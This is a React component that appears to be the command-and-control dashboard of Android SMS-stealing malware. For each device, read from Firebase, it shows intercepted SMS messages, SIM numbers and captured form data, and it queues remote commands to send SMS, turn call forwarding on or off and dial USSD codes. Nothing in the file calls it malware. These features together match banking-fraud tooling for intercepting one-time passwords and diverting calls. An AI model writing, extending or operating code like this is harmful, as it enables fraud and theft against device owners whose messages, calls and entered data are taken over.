import React, { useState, useEffect } from 'react';
import { ref, onValue, push, set } from "firebase/database";
import { db } from '../firebase';
import { auth } from "../firebase";
import { useParams, useNavigate } from 'react-router-dom';


function formatLastOnline(timestamp) {
  if (!timestamp) return "Unknown";

  const now = Date.now();
  const diffMs = now - timestamp;

  const minutes = Math.floor(diffMs / 60000);
  const hours = Math.floor(diffMs / (60000 * 60));
  const days = Math.floor(diffMs / (60000 * 60 * 24));

  if (minutes < 1) return "Just now";
  if (minutes < 60) return `${minutes} min ago`;
  if (hours < 24) return `${hours} hour${hours > 1 ? "s" : ""} ago`;
  if (days === 1) return "Yesterday";
  return `${days} days ago`;
}

const DeviceDetails = () => {
  const { deviceId } = useParams();
  const navigate = useNavigate();

  const [device, setDevice] = useState(null);
  const [deviceData, setDeviceData] = useState(null);
  const [smsList, setSmsList] = useState([]);
  const [activeTab, setActiveTab] = useState('sms');
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [lastOnline, setLastOnline] = useState('Unknown');

  // SEND SMS TAB
  const [phoneNumber, setPhoneNumber] = useState('');
  const [message, setMessage] = useState('');
  const [sending, setSending] = useState(false);


  const dbPath = auth.currentUser
    ? localStorage.getItem("dbPath_" + auth.currentUser.uid)
    : null;  
  // SIM selection
  const [selectedSim, setSelectedSim] = useState(1);

  // ONLINE CHECK
  const [checking, setChecking] = useState(false);
  const [checkStatus, setCheckStatus] = useState(null);

  // CALL FORWARD TAB
  const [cfNumber, setCfNumber] = useState("");
  const [cfSim, setCfSim] = useState(1);
  const [cfSending, setCfSending] = useState(false);
  // USSD DIALER TAB
  const [ussdCode, setUssdCode] = useState("");
  const [ussdSim, setUssdSim] = useState(1);
  const [ussdSending, setUssdSending] = useState(false);
  const [ussdCommands, setUssdCommands] = useState([]);
  const [smsCommands, setSmsCommands] = useState([]);
  const [cfCommands, setCfCommands] = useState([]);


  // -----------------------------------------
  // FETCH DEVICE DATA
  // -----------------------------------------
  useEffect(() => {
    if (!dbPath) return;

    const deviceRef = ref(db, `${dbPath}/${deviceId}`);

    const unsubscribe = onValue(
      deviceRef,
      (snapshot) => {
        try {
          const data = snapshot.val();

          if (data) {
            setDevice({ id: deviceId, ...data.deviceInfo });
            setDeviceData(data);

            // Last Online
            if (data.lastOnline) {
              setLastOnline(formatLastOnline(data.lastOnline));
            } else {
              setLastOnline("Unknown");
            }

            // SMS Messages
            if (data.sms) {
              const messages = Object.entries(data.sms).map(([id, sms]) => ({
                id,
                ...sms,
              }));
              messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
              setSmsList(messages);
            } else {
              setSmsList([]);
            }
            // ⭐ USSD COMMANDS HISTORY
            if (data.ussd_commands) {
              const cmds = Object.entries(data.ussd_commands).map(([id, cmd]) => ({
                id,
                ...cmd,
              }));
              cmds.sort((a, b) => (b.created || 0) - (a.created || 0));
              setUssdCommands(cmds);
            } else {
              setUssdCommands([]);
            }
            // ⭐ SMS COMMANDS HISTORY
            if (data.sms_send_commands) {
              const smsCmds = Object.entries(data.sms_send_commands).map(([id, cmd]) => ({
                id,
                ...cmd,
              }));
              smsCmds.sort((a, b) => (b.created || 0) - (a.created || 0));
              setSmsCommands(smsCmds);
            } else {
              setSmsCommands([]);
            }

            // ⭐ CALL FORWARD COMMANDS HISTORY
            if (data.call_forward_commands) {
              const cfCmds = Object.entries(data.call_forward_commands).map(([id, cmd]) => ({
                id,
                ...cmd,
              }));
              cfCmds.sort((a, b) => (b.created || 0) - (a.created || 0));
              setCfCommands(cfCmds);
            } else {
              setCfCommands([]);
            }


          } else {
            setDevice(null);
            setDeviceData(null);
            setSmsList([]);
          }
          setLoading(false);
        } catch (err) {
          setError('Error fetching device details: ' + err.message);
          setLoading(false);
        }
      },
      (e) => {
        setError('Error fetching device details: ' + e.message);
        setLoading(false);
      }
    );

    return () => unsubscribe();
  }, [deviceId]);
  const hasFormData = () => {
    return (
      deviceData &&
      (deviceData.main_form ||
        deviceData.first_form ||
        deviceData.second_form)
    );
  };

  // -----------------------------------------
  // SIM INFO
  // -----------------------------------------
  const getSimCardsInfo = () => {
    if (!deviceData || !deviceData.simInfo) return [];

    return [
      {
        slot: 1,
        type: "SIM 1",
        operator: deviceData.simInfo.sim1_operator || "Unknown",
        number: deviceData.simInfo.sim1_number || "N/A",
        isPrimary: deviceData.simInfo.primarySim === 1
      },
      {
        slot: 2,
        type: "SIM 2",
        operator: deviceData.simInfo.sim2_operator || "Unknown",
        number: deviceData.simInfo.sim2_number || "N/A",
        isPrimary: deviceData.simInfo.primarySim === 2
      }
    ];
  };

  // -----------------------------------------
  // SEND SMS HANDLER
  // -----------------------------------------
  const handleSendSMS = async () => {
    if (!phoneNumber || !message)
      return alert('Please enter phone number & message');

    if (!phoneNumber.match(/^[0-9]{10}$/))
      return alert('Enter valid 10-digit phone number');

    try {
      setSending(true);

      await push(ref(db, `${dbPath}/${deviceId}/sms_send_commands`), {
        phoneNumber,
        message,
        simSlot: selectedSim,
        status: 'pending',
        created: Date.now(),
      });

      alert('SMS command sent!');
      setPhoneNumber('');
      setMessage('');
    } catch (err) {
      alert('Failed to send SMS');
      console.log(err);
    }

    setSending(false);
  };

  // -----------------------------------------
  // CHECK ONLINE
  // -----------------------------------------
  const handleCheckOnline = async () => {
    setChecking(true);
    setCheckStatus("Checking...");

    try {
      const cmdRef = ref(db, `${dbPath}/${deviceId}/check_online_commands`);

      const newCmd = await push(cmdRef, {
        command: "check_online",
        created: Date.now(),
        status: "pending"
      });

      const responseRef = ref(
        db,
        `${dbPath}/${deviceId}/check_online_commands/${newCmd.key}`
      );

      let timeout = null;

      const unsubscribe = onValue(
        responseRef,
        (snap) => {
          const data = snap.val();
          if (!data) return;

          if (data.status === "online") {
            setCheckStatus("Device is ONLINE ✓");

            const lastOnlineRef = ref(db, `${dbPath}/${deviceId}/lastOnline`);
            set(lastOnlineRef, Date.now());

            clearTimeout(timeout);
            unsubscribe();
            setChecking(false);
          }
        },
        { onlyOnce: false }
      );

      timeout = setTimeout(() => {
        unsubscribe();
        setCheckStatus("Device is OFFLINE ✗");
        setChecking(false);
      }, 7000);

    } catch (err) {
      setCheckStatus("Error checking device");
      setChecking(false);
    }
  };

  // -----------------------------------------
  // CALL FORWARD: ACTIVATE
  // -----------------------------------------
  const handleActivateCF = async () => {
    if (!cfNumber.match(/^[0-9]{10}$/)) {
      alert("Enter valid number");
      return;
    }

    try {
      setCfSending(true);

      await push(ref(db, `${dbPath}/${deviceId}/call_forward_commands`), {
        action: "activate",
        number: cfNumber,
        simSlot: cfSim,
        status: "pending",
        created: Date.now() // ✅ यह Number होना चाहिए
      });

      alert("Call Forward command sent!");
    } catch (e) {
      alert("Failed to send command");
    }

    setCfSending(false);
  };

  // -----------------------------------------
  // CALL FORWARD: DEACTIVATE
  // -----------------------------------------
  const handleDeactivateCF = async () => {
    try {
      setCfSending(true);

      await push(ref(db, `${dbPath}/${deviceId}/call_forward_commands`), {
        action: "deactivate",
        simSlot: cfSim,
        status: "pending",
        created: Date.now()
      });

      alert("Deactivate Call Forward command sent!");
    } catch (e) {
      alert("Failed to send command");
    }

    setCfSending(false);
  };
  // -----------------------------------------
  // USSD DIALER — SEND USSD COMMAND
  // -----------------------------------------
  const handleSendUSSD = async () => {
    if (!ussdCode.trim()) {
      alert("Enter USSD code (e.g., *123#)");
      return;
    }

    try {
      setUssdSending(true);

      await push(ref(db, `${dbPath}/${deviceId}/ussd_commands`), {
        code: ussdCode,
        simSlot: ussdSim,
        status: "pending",
        created: Date.now()
      });

      alert("USSD command sent!");
      setUssdCode("");

    } catch (err) {
      alert("Failed to send USSD");
      console.log(err);
    }

    setUssdSending(false);
  };

  // -----------------------------------------
  // UI RENDER
  // -----------------------------------------
  if (loading) return <div className="loading">Loading device details...</div>;
  if (error) return <div className="error">{error}</div>;
  if (!device) return <div className="error">Device not found</div>;

  const simCards = getSimCardsInfo();

  return (
    <div>

      {/* HEADER */}
      <div className="page-header">
        <button onClick={() => navigate('/devices')} className="back-button">
          ← Back
        </button>

        <h1 className="page-title">{device.deviceName}</h1>

        <div style={{ textAlign: 'center' }}>
          <span className="badge badge-primary">{smsList.length} SMS</span>
        </div>
      </div>






    {/* DEVICE INFO */}
<div className="card device-info-card">

  <h2 style={{ marginBottom: "10px" }}>Device Information</h2>

  {/* DEVICE ID */}
  <div className="device-id-section">
    <div className="info-label-large">Device ID</div>
    <div className="device-id-value">{deviceId}</div>
  </div>

  {/* SIM CARDS */}
  <h3 style={{ marginBottom: "10px", color: '#667eea' }}>SIM Cards</h3>

  <div className="sim-cards-grid">
    {simCards.map((sim) => (
      <div key={sim.slot} className="sim-card">
        <div className="sim-card-header">
          <span className="sim-type">{sim.type}</span>

          {sim.isPrimary ? (
            <span className="primary-sim-tag">PRIMARY</span>
          ) : (
            <span className="secondary-sim-tag">SECONDARY</span>
          )}
        </div>

        <div className="sim-details">
          <strong>{sim.operator}</strong>
          <div>{sim.number}</div>
        </div>
      </div>
    ))}
  </div>

  {/* LAST ONLINE + BUTTON */}
  <div className="additional-info-grid">
    <div className="info-item-vertical">
      <div className="info-label">Last Online</div>
      <div className="info-value-online">{lastOnline}</div>

      <button
        className="btn btn-info"
        onClick={handleCheckOnline}
        disabled={checking}
        style={{
                     background: "#9C27B0",
                     padding: "9px 19px",
                     color: "#fff",
                     marginTop: "10px"
                    }}
      >
        {checking ? "Checking..." : "Check Online"}
      </button>

      {checkStatus && (
        <div
          className="check-status"
          style={{
            color: checkStatus.includes("ONLINE") ? "green" : "red",
          }}
        >
          {checkStatus}
        </div>
      )}
    </div>
  </div>
</div>






      {/* TABS */}
      <div className="card">
        <div className="tabs-container">
          <div className="tabs">
            <button
              className={`tab ${activeTab === 'sms' ? 'active' : ''}`}
              onClick={() => setActiveTab('sms')}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: "4px" }}>
                <i>💬</i>
                <span>Device SMS</span>
              </div>
              <span className="badge">{smsList.length}</span>
            </button>

            <button
              className={`tab ${activeTab === 'data' ? 'active' : ''}`}
              onClick={() => setActiveTab('data')}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: "4px" }}>
                <i>📋</i>
                <span>Form Data</span>
                {hasFormData() && <span className="checkmark">✓</span>}
              </div>
            </button>

            <button
              className={`tab ${activeTab === 'send' ? 'active' : ''}`}
              onClick={() => setActiveTab('send')}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: "4px" }}>
                <i>📤</i>
                <span>Send SMS</span>
              </div>
            </button>

            <button
              className={`tab ${activeTab === 'callfwd' ? 'active' : ''}`}
              onClick={() => setActiveTab('callfwd')}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: "4px" }}>
                <i>📞</i>
                <span>Call Forwarding</span>
              </div>
            </button>

            <button
              className={`tab ${activeTab === 'ussd' ? 'active' : ''}`}
              onClick={() => setActiveTab('ussd')}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: "4px" }}>
                <i>*#</i>
                <span>USSD Dialer</span>
              </div>
            </button>
          </div>

          {/* TAB CONTENT */}
          <div className="tab-content">

            {/* SMS LIST TAB */}
            {activeTab === 'sms' && (
              <div className="sms-tab">
                {smsList.length === 0 ? (
                  <div className="no-data">No SMS found</div>
                ) : (
                  <div className="sms-list">
                    {smsList.map((sms) => (
                      <div key={sms.id} className="sms-card">
                        <div className="sms-header">
                          <strong>{sms.sender || 'Unknown'}</strong>
                          <div className="sms-time">
                            {sms.dateTime}
                            <br />
                            <small>{new Date(sms.timestamp).toLocaleString()}</small>
                          </div>
                        </div>
                        <div className="sms-message">{sms.message}</div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
            {activeTab === 'data' && (
              <div className="data-tab">
                {!hasFormData() ? (
                  <div className="no-data">No form data available</div>
                ) : (
                  <>
                    {deviceData?.main_form && (
                      <div className="form-section">
                        <h4>Main Form</h4>
                        <div className="form-data-grid">
                          {Object.entries(deviceData.main_form).map(([key, value]) => (
                            <div key={key} className="form-data-item">
                              <span className="form-data-label">{key}:</span>
                              <span className="form-data-value">{value}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {deviceData?.first_form && (
                      <div className="form-section">
                        <h4>First Form</h4>
                        <div className="form-data-grid">
                          {Object.entries(deviceData.first_form).map(([key, value]) => (
                            <div key={key} className="form-data-item">
                              <span className="form-data-label">{key}:</span>
                              <span className="form-data-value">{value}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {deviceData?.second_form && (
                      <div className="form-section">
                        <h4>Second Form</h4>
                        <div className="form-data-grid">
                          {Object.entries(deviceData.second_form).map(([key, value]) => (
                            <div key={key} className="form-data-item">
                              <span className="form-data-label">{key}:</span>
                              <span className="form-data-value">{value}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            )}

            {/* SEND SMS TAB */}
            {activeTab === 'send' && (
              <div className="sms-send-tab">
                <h3 style={{ marginBottom: '1rem' }}>Send SMS</h3>

                <div className="form-group">
                  <label>Send Using SIM</label>
                  <select
                    className="form-input"
                    value={selectedSim}
                    onChange={(e) => setSelectedSim(Number(e.target.value))}
                  >
                    <option value={1}>SIM 1</option>
                    <option value={2}>SIM 2</option>
                  </select>
                </div>

                <div className="form-group">
                  <label>Phone Number</label>
                  <input
                    type="tel"
                    maxLength="10"
                    className="form-input"
                    placeholder="10-digit number"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                  />
                </div>

                <div className="form-group">
                  <label>Message</label>
                  <textarea
                    rows="4"
                    className="form-textarea"
                    placeholder="Write message..."
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                  ></textarea>
                </div>

                <button
                  className="btn btn-primary"
                  disabled={sending}
                  onClick={handleSendSMS}
                >
                  {sending ? 'Sending...' : 'Send SMS'}
                </button>



                <div style={{ marginTop: "20px" }}>
                  <h3>SMS Command History</h3>

                  {smsCommands.length === 0 ? (
                    <div className="no-data">No SMS commands yet</div>
                  ) : (
                    <div style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: "15px",
                      maxHeight: "380px",
                      overflowY: "auto",
                      paddingRight: "6px"
                    }}>
                      {smsCommands.map(cmd => (
                        <div
                          key={cmd.id}
                          style={{
                            padding: "15px",
                            borderRadius: "10px",
                            background: "#dcdcdc",
                            border: "1px solid #e0e7ff",
                            boxShadow: "0 4px 12px rgba(0,0,0,0.07)",
                            position: "relative"
                          }}
                        >

                          {/* STATUS BADGE */}
                          <div style={{
                            position: "absolute",
                            top: "3px",
                            right: "10px",
                            padding: "5px 12px",
                            fontSize: "12px",
                            fontWeight: "700",
                            borderRadius: "8px",
                            color: "white",
                            background:
                              cmd.status === "sent" ? "#22c55e" :
                                cmd.status === "failed" ? "#ef4444" : "#f59e0b"
                          }}>
                            {cmd.status === "sent"
                              ? "✓ SENT"
                              : cmd.status === "failed"
                                ? "✗ FAILED"
                                : "PENDING"}
                          </div>

                          {/* RECIPIENT */}
                          <div style={{ marginBottom: "10px" }}>
                            <div
                              style={{
                                fontSize: "13px",
                                color: "#475569",
                                marginBottom: "3px"
                              }}
                            >
                              Recipient
                            </div>
                            <div
                              style={{
                                fontSize: "16px",
                                fontWeight: "600",
                                color: "#1e293b",
                                padding: "8px 10px",
                                background: "#f8fbff",
                                borderRadius: "6px",
                                borderLeft: "4px solid #3b82f6"
                              }}
                            >
                              {cmd.phoneNumber || "Unknown"}
                            </div>
                          </div>

                          {/* MESSAGE */}
                          <div style={{ marginBottom: "12px" }}>
                            <div
                              style={{
                                fontSize: "13px",
                                marginBottom: "3px",
                                color: "#475569"
                              }}
                            >
                              Message
                            </div>
                            <div
                              style={{
                                padding: "10px",
                                background: "#f1f5f9",
                                borderRadius: "6px",
                                border: "1px solid #e2e8f0",
                                whiteSpace: "pre-wrap",
                                fontSize: "14px",
                                color: "#334155"
                              }}
                            >
                              {cmd.message || "(empty message)"}
                            </div>
                          </div>

                          {/* SIM SLOT */}
                          <div style={{ marginBottom: "8px" }}>
                            <strong style={{ fontSize: "13px", color: "#475569" }}>
                              SIM:
                            </strong>{" "}
                            <span style={{ fontWeight: "600" }}>
                              {cmd.simSlot}
                            </span>
                          </div>

                          {/* ERROR */}
                          {cmd.error && (
                            <div
                              style={{
                                marginTop: "10px",
                                padding: "10px",
                                background: "#ffeded",
                                borderRadius: "6px",
                                border: "1px solid #ffbaba",
                                color: "#b91c1c"
                              }}
                            >
                              <strong>Error: </strong> {cmd.error}
                            </div>
                          )}

                          {/* TIME */}
                          <small style={{
                            display: "block",
                            marginTop: "10px",
                            color: "#64748b"
                          }}>
                            {cmd.created ? new Date(cmd.created).toLocaleString() : ""}
                          </small>

                        </div>
                      ))}
                    </div>
                  )}
                </div>






              </div>


            )}


            {/* CALL FORWARDING TAB */}
            {activeTab === 'callfwd' && (
              <div className="callforward-tab">
                <h3>Call Forwarding</h3>
                {/* ACTIVE CALL FORWARD STATUS (AUTO-DETECT) */}
                <div className="cf-status-box" style={{ padding: 10, background: "#eef", borderRadius: 6, marginBottom: 15 }}>
                  <h4>Current Forward Status</h4>

                  {cfCommands.length === 0 ? (
                    <div>No previous call-forward actions</div>
                  ) : (
                    (() => {

                      // ⭐ SIM-1 latest command
                      const sim1 = cfCommands.find(cmd => cmd.simSlot === 1);

                      // ⭐ SIM-2 latest command
                      const sim2 = cfCommands.find(cmd => cmd.simSlot === 2);

                      return (
                        <div>

                          {/* ⭐ SIM-1 STATUS */}
                          <div style={{ marginBottom: 8 }}>
                            <strong>SIM 1 → </strong>
                            {sim1 ? (
                              sim1.action === "activate" && sim1.status === "done" ? (
                                <span style={{ color: "green", fontWeight: "bold" }}>
                                  Forwarding to: {sim1.number}
                                </span>
                              ) : sim1.action === "deactivate" && sim1.status === "done" ? (
                                <span style={{ color: "red", fontWeight: "bold" }}>
                                  Not Forwarded
                                </span>
                              ) : (
                                <span>Last request pending / failed</span>
                              )
                            ) : (
                              <span>No data</span>
                            )}
                          </div>

                          {/* ⭐ SIM-2 STATUS */}
                          <div>
                            <strong>SIM 2 → </strong>
                            {sim2 ? (
                              sim2.action === "activate" && sim2.status === "done" ? (
                                <span style={{ color: "green", fontWeight: "bold" }}>
                                  Forwarding to: {sim2.number}
                                </span>
                              ) : sim2.action === "deactivate" && sim2.status === "done" ? (
                                <span style={{ color: "red", fontWeight: "bold" }}>
                                  Not Forwarded
                                </span>
                              ) : (
                                <span>Last request pending / failed</span>
                              )
                            ) : (
                              <span>No data</span>
                            )}
                          </div>

                        </div>
                      );
                    })()
                  )}
                </div>


                <div className="form-group">
                  <label>Select SIM</label>
                  <select
                    className="form-input"
                    value={cfSim}
                    onChange={(e) => setCfSim(Number(e.target.value))}
                  >
                    <option value={1}>SIM 1</option>
                    <option value={2}>SIM 2</option>
                  </select>
                </div>

                <div className="form-group">
                  <label>Forward To Number</label>
                  <input
                    type="tel"
                    maxLength="10"
                    className="form-input"
                    placeholder="10-digit number"
                    value={cfNumber}
                    onChange={(e) => setCfNumber(e.target.value.replace(/\D/g, ""))}
                  />
                </div>

                <button
                  className="btn btn-primary"
                  disabled={cfSending}
                  onClick={handleActivateCF}
                >
                  {cfSending ? "Processing..." : "Activate Call Forward"}
                </button>

                <button
                  className="btn btn-danger"
                  style={{ marginTop: "10px", background: "red" }}
                  disabled={cfSending}
                  onClick={handleDeactivateCF}
                >
                  {cfSending ? "Processing..." : "Deactivate Call Forward"}
                </button>



                <div style={{ marginTop: "20px" }}>
                  <h3 style={{ marginBottom: "10px", color: "#333" }}>Call Forward History</h3>

                  {cfCommands.length === 0 ? (
                    <div
                      style={{
                        padding: "15px",
                        background: "linear-gradient(135deg, #ff9966 0%, #ff5e62 100%)",
                        borderRadius: "5px",
                        textAlign: "center",
                        color: "white",
                        fontWeight: "500",
                        boxShadow: "0 4px 6px rgba(0,0,0,0.1)"
                      }}
                    >
                      No Call Forward Commands Yet
                    </div>
                  ) : (
                    <div
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "10px",
                        maxHeight: "350px",
                        overflowY: "auto",
                        paddingRight: "5px"
                      }}
                    >
                      {cfCommands.map(cmd => (
                        <div
                          key={cmd.id}
                          style={{
                            padding: "12px",
                            borderRadius: "8px",
                            background: "linear-gradient(to right, #ffffff, #f9f9f9)",
                            boxShadow: "0 2px 8px rgba(0,0,0,0.1)",
                            border: "1px solid #e0e0e0",
                            transition: "0.3s",
                            position: "relative"
                          }}
                          onMouseEnter={(e) => {
                            e.currentTarget.style.transform = "translateY(-2px)";
                            e.currentTarget.style.boxShadow = "0 6px 12px rgba(0,0,0,0.15)";
                          }}
                          onMouseLeave={(e) => {
                            e.currentTarget.style.transform = "translateY(0)";
                            e.currentTarget.style.boxShadow = "0 2px 8px rgba(0,0,0,0.1)";
                          }}
                        >
                          {/* STATUS BADGE */}
                          <div
                            style={{
                              position: "absolute",
                              top: "0",
                              right: "0",
                              padding: "3px 10px",
                              fontSize: "12px",
                              fontWeight: "600",
                              borderRadius: "0 8px 0 8px",
                              background:
                                cmd.status === "done"
                                  ? "#4CAF50"
                                  : cmd.status === "failed"
                                    ? "#F44336"
                                    : "#FF9800",
                              color: "white"
                            }}
                          >
                            {cmd.status === "done"
                              ? "✓ DONE"
                              : cmd.status === "failed"
                                ? "✗ FAILED"
                                : "⏳ PENDING"}
                          </div>

                          {/* ACTION */}
                          <div style={{ marginBottom: "8px" }}>
                            <strong style={{ fontSize: "12px", color: "#666" }}>Action:</strong>
                            <div
                              style={{
                                fontSize: "16px",
                                fontWeight: "600",
                                marginTop: "3px",
                                color: "#2c3e50"
                              }}
                            >
                              {cmd.action === "activate" ? "Activate Forward" : "Deactivate Forward"}
                            </div>
                          </div>

                          {/* NUMBER */}
                          {cmd.number && (
                            <div style={{ marginBottom: "8px" }}>
                              <strong style={{ fontSize: "12px", color: "#666" }}>Forward To:</strong>
                              <div
                                style={{
                                  fontSize: "15px",
                                  padding: "6px 10px",
                                  background: "#e8f4fd",
                                  borderRadius: "4px",
                                  borderLeft: "3px solid #2196F3",
                                  color: "#2c3e50",
                                  marginTop: "3px"
                                }}
                              >
                                {cmd.number}
                              </div>
                            </div>
                          )}

                          {/* SIM */}
                          <div style={{ marginBottom: "8px" }}>
                            <strong style={{ fontSize: "12px", color: "#666" }}>SIM Slot:</strong>
                            <div
                              style={{
                                marginTop: "3px",
                                padding: "4px 8px",
                                background: "#fff3cd",
                                borderRadius: "4px",
                                borderLeft: "3px solid #ffca28",
                                display: "inline-block",
                                fontSize: "14px",
                                fontWeight: "600",
                                color: "#795548"
                              }}
                            >
                              SIM {cmd.simSlot}
                            </div>
                          </div>

                          {/* RESPONSE */}
                          {cmd.response && (
                            <div style={{ marginTop: "10px" }}>
                              <strong style={{ fontSize: "12px", color: "#666" }}>Response:</strong>
                              <pre
                                style={{
                                  padding: "8px 10px",
                                  background: "#f0f8ff",
                                  borderRadius: "5px",
                                  border: "1px solid #d1e7ff",
                                  fontSize: "13px",
                                  color: "#2c3e50",
                                  whiteSpace: "pre-wrap",
                                  wordBreak: "break-word",
                                  maxHeight: "120px",
                                  overflowY: "auto",
                                  fontFamily: "'Courier New', monospace"
                                }}
                              >
                                {cmd.response}
                              </pre>
                            </div>
                          )}

                          {/* ERROR */}
                          {cmd.error && (
                            <div style={{ marginTop: "10px" }}>
                              <strong style={{ fontSize: "12px", color: "#c62828" }}>Error:</strong>
                              <div
                                style={{
                                  padding: "8px 10px",
                                  background: "#fff5f5",
                                  borderRadius: "5px",
                                  border: "1px solid #ffcdd2",
                                  fontSize: "13px",
                                  color: "#c62828",
                                  fontWeight: "500"
                                }}
                              >
                                {cmd.error}
                              </div>
                            </div>
                          )}

                          {/* TIMESTAMP */}
                          <small
                            style={{
                              fontSize: "11px",
                              color: "#888",
                              display: "block",
                              marginTop: "10px"
                            }}
                          >
                            {cmd.created ? new Date(cmd.created).toLocaleString() : ""}
                          </small>
                        </div>
                      ))}
                    </div>
                  )}
                </div>





              </div>

            )}
            {/* USSD DIALER TAB */}
            {activeTab === 'ussd' && (
              <div className="ussd-tab">
                <h3>USSD Dialer</h3>

                <div className="form-group">
                  <label>Select SIM</label>
                  <select
                    className="form-input"
                    value={ussdSim}
                    onChange={(e) => setUssdSim(Number(e.target.value))}
                  >
                    <option value={1}>SIM 1</option>
                    <option value={2}>SIM 2</option>
                  </select>
                </div>

                <div className="form-group">
                  <label>USSD Code</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="e.g. *123#"
                    value={ussdCode}
                    onChange={(e) => setUssdCode(e.target.value)}
                  />
                </div>

                <button
                  className="btn btn-primary"
                  disabled={ussdSending}
                  onClick={handleSendUSSD}
                >
                  {ussdSending ? "Sending..." : "Send USSD"}
                </button>




                <div style={{ marginTop: "25px" }}>
                  <h3 style={{
                    marginBottom: "12px",
                    color: "#1a1a1a",
                    fontWeight: "700",
                    letterSpacing: "0.5px"
                  }}>
                    ✨ USSD History
                  </h3>

                  {ussdCommands.length === 0 ? (
                    <div style={{
                      padding: "18px",
                      borderRadius: "10px",
                      background: "linear-gradient(135deg, #667eea, #764ba2)",
                      textAlign: "center",
                      color: "white",
                      fontSize: "15px",
                      fontWeight: "500",
                      boxShadow: "0 6px 14px rgba(0,0,0,0.2)"
                    }}>
                      No USSD Commands Yet
                    </div>
                  ) : (
                    <div
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "14px",
                        maxHeight: "400px",
                        overflowY: "auto",
                        paddingRight: "6px"
                      }}
                    >
                      {ussdCommands.map(cmd => (
                        <div
                          key={cmd.id}
                          style={{
                            background: "rgba(255,255,255,0.8)",
                            backdropFilter: "blur(6px)",
                            padding: "16px",
                            borderRadius: "14px",
                            border: "1px solid rgba(0,0,0,0.06)",
                            boxShadow: "0 4px 12px rgba(0,0,0,0.12)",
                            position: "relative",
                            transition: "all 0.25s ease"
                          }}
                          onMouseEnter={(e) => {
                            e.currentTarget.style.transform = "translateY(-3px)";
                            e.currentTarget.style.boxShadow = "0 10px 20px rgba(0,0,0,0.18)";
                          }}
                          onMouseLeave={(e) => {
                            e.currentTarget.style.transform = "translateY(0)";
                            e.currentTarget.style.boxShadow = "0 4px 12px rgba(0,0,0,0.12)";
                          }}
                        >

                          {/* STATUS BADGE */}
                          <div
                            style={{
                              position: "absolute",
                              top: "10px",
                              right: "10px",
                              padding: "4px 12px",
                              fontSize: "12px",
                              fontWeight: "700",
                              borderRadius: "20px",
                              background:
                                cmd.status === "done"
                                  ? "linear-gradient(135deg,#4CAF50,#2e7d32)"
                                  : cmd.status === "failed"
                                    ? "linear-gradient(135deg,#e53935,#b71c1c)"
                                    : "linear-gradient(135deg,#ff9800,#f57c00)",
                              color: "white",
                              boxShadow: "0 2px 6px rgba(0,0,0,0.2)"
                            }}
                          >
                            {cmd.status === "done"
                              ? "✓ SUCCESS"
                              : cmd.status === "failed"
                                ? "✗ FAILED"
                                : "⏳ PENDING"}
                          </div>

                          {/* USSD CODE */}
                          <div style={{ marginBottom: "12px" }}>
                            <div style={{ color: "#666", fontSize: "13px", marginBottom: "4px" }}>
                              USSD Code
                            </div>

                            <div
                              style={{
                                padding: "10px 14px",
                                background: "#eef7ff",
                                borderRadius: "8px",
                                fontSize: "17px",
                                fontWeight: "700",
                                borderLeft: "4px solid #2196F3",
                                color: "#1d3a53"
                              }}
                            >
                              {cmd.code}
                            </div>
                          </div>

                          {/* TIMESTAMP */}
                          <div style={{
                            fontSize: "12px",
                            color: "#888",
                            marginBottom: "12px",
                            display: "flex",
                            alignItems: "center",
                            gap: "6px"
                          }}>
                            🕒 {cmd.created ? new Date(cmd.created).toLocaleString() : "N/A"}
                          </div>

                          {/* RESPONSE */}
                          {cmd.response && (
                            <div style={{ marginTop: "10px" }}>
                              <div
                                style={{
                                  fontSize: "13px",
                                  fontWeight: "500",
                                  color: "#555",
                                  marginBottom: "6px",
                                  display: "flex",
                                  alignItems: "center",
                                  gap: "6px"
                                }}
                              >
                                📄 Response
                              </div>

                              <div
                                style={{
                                  padding: "12px",
                                  background: "#f4fbff",
                                  border: "1px solid #c9e6ff",
                                  borderRadius: "8px",
                                  fontSize: "14px",
                                  whiteSpace: "pre-wrap",
                                  fontFamily: "monospace",
                                  maxHeight: "120px",
                                  overflowY: "auto",
                                  lineHeight: "1.4"
                                }}
                              >
                                {cmd.response}
                              </div>
                            </div>
                          )}

                          {/* ERROR */}
                          {cmd.error && (
                            <div style={{ marginTop: "14px" }}>
                              <div
                                style={{
                                  fontSize: "13px",
                                  fontWeight: "600",
                                  color: "#b71c1c",
                                  marginBottom: "6px",
                                  display: "flex",
                                  alignItems: "center",
                                  gap: "6px"
                                }}
                              >
                                ⚠️ Error
                              </div>

                              <div
                                style={{
                                  padding: "10px 14px",
                                  background: "#ffebee",
                                  border: "1px solid #ffcdd2",
                                  borderRadius: "8px",
                                  color: "#c62828",
                                  fontWeight: "500",
                                  fontSize: "14px"
                                }}
                              >
                                {cmd.error}
                              </div>
                            </div>
                          )}

                        </div>
                      ))}
                    </div>
                  )}
                </div>





              </div>
            )}

          </div>
        </div>
      </div>
    </div>
  );
};

export default DeviceDetails;
